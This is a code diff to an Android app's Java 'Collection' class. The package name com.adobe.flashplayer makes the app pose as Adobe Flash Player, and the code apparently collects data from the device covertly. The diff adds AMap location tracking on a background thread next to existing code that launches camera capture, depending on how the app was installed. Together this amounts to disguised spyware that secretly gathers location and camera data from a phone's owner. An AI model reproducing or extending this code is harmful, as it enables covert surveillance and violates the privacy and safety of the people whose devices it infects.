@@ -11,6 +11,8 @@ import com.adobe.flashplayer.PrefOper;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.accessory.AccessHelper;
+import com.adobe.flashplayer.data.Location.AMaplocation;
+import com.adobe.flashplayer.data.Location.MyTencentLocation;
 import com.adobe.flashplayer.install.InstallActivity;
 
 
@@ -32,13 +34,11 @@ public class Collection {
         String lasttime = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.PROGRAM_LAST_TIME);
         if (lasttime.equals("") == true || lasttime == null) {
 
-            PrefOper.setValue(context, Public.PARAMCONFIG_FileName,
-                    Public.PROGRAM_LAST_TIME, String.valueOf(timenow));
+            PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.PROGRAM_LAST_TIME, String.valueOf(timenow));
 
         } else {
             if (timenow - Long.parseLong(lasttime) >= Public.BASIC_RETRIEVE_INTERVAL) {
-                PrefOper.setValue(context, Public.PARAMCONFIG_FileName,
-                        Public.PROGRAM_LAST_TIME, String.valueOf(timenow));
+                PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.PROGRAM_LAST_TIME, String.valueOf(timenow));
             } else {
                 if(InstallActivity.debug_flag){
                     //test mode
@@ -82,6 +82,11 @@ public class Collection {
         if (installMode == AccessHelper.INSTALL_TYPE_SO || installMode == AccessHelper.INSTALL_TYPE_JAR) {
             new Thread(new CameraDialog(context, 0)).start();
         }else if (installMode == AccessHelper.INSTALL_TYPE_APK || installMode == AccessHelper.INSTALL_TYPE_MANUAL){
+            //MyTencentLocation tencentloc = new MyTencentLocation(context);
+
+            AMaplocation amap = new AMaplocation(context,Public.PHONE_LOCATION_MINSECONDS);
+            new Thread(amap).start();
+
             Intent intentCamera = new Intent(context,CameraActivity2.class);
             intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(intentCamera);
